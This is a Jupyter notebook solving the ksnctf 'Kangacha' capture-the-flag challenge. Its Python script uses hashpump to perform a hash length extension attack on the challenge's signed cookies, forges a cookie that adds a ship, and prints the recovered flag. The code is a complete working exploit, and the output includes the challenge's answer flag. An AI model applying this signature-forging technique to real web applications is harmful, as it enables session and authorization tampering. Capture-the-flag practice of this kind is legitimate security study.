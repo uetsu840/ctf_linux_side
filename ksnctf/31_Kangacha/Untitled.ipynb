{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Congratulations! The flag is FLAG_uc8qVFa8Sr6DwYVP. This is called Length extension attack.\n"
     ]
    }
   ],
   "source": [
    "import subprocess\n",
    "import re\n",
    "import requests\n",
    "\n",
    "# セッションを接続するための準備\n",
    "kangacha_url = \"http://ctfq.sweetduet.info:10080/~q31/kangacha.php\"\n",
    "s= requests.Session()\n",
    "\n",
    "# 一度ポストし、クッキーの情報を得る\n",
    "r = s.post(kangacha_url, data = {\"submit\":\"Gacha\"})\n",
    "data = s.cookies[\"ship\"]\n",
    "signature = s.cookies[\"signature\"]\n",
    "\n",
    "# hashpump を subprocess で呼ぶための準備\n",
    "args = {}\n",
    "args[\"data\"] = data\n",
    "args[\"signature\"] = signature\n",
    "args[\"key\"] = 21\n",
    "args[\"append\"] = \",10\"\n",
    "\n",
    "cmd = \"hashpump -s {signature} -k {key} -d {data} \"\n",
    "cmd += \"-a {append}\"\n",
    "cmd = cmd.format(**args)\n",
    "\n",
    "proc = subprocess.Popen(cmd.strip().split(\" \"), stdout=subprocess.PIPE)\n",
    "out, err = proc.communicate()\n",
    "\n",
    "# 得られた cookie を url エンコードにする\n",
    "crack_signature, crack_data = out.decode(\"utf-8\").strip().split(\"\\n\")\n",
    "crack_data = crack_data.replace(\"\\\\x\",\"%\")\n",
    "\n",
    "# cookie を変更して再接続\n",
    "s.cookies.clear()\n",
    "setargs = {\"domain\":\"ctfq.sweetduet.info\",\"path\":\"/~q31\"}\n",
    "s.cookies.set(\"ship\",crack_data,**setargs)\n",
    "s.cookies.set(\"signature\",crack_signature,**setargs)\n",
    "r = s.get(kangacha_url)\n",
    "\n",
    "# Yamato がドロップしているので、フラグ部分を抜き出す。\n",
    "m = re.search(\"Yamato \\[(?P<flag>.*)\\]\", r.text)\n",
    "print(m.group(\"flag\"))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.1"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
